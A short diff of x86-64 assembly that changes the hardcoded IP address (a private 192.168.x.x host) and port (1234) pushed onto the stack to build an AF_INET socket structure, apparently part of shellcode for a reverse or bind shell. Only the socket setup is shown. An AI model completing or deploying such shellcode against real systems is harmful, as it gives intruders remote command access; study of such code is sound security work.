@@ -19,8 +19,8 @@ _start:
 
 ;Creating the structure
 	xor rax, rax
-	push dword 0x040200 ;IP
-	push word 0x204       ;Port
+	push dword 0x04b2a8c0 ;IP
+	push word 0xd204       ;Port
 	push word 0x02
 
 ;Move stack pointer to RSI
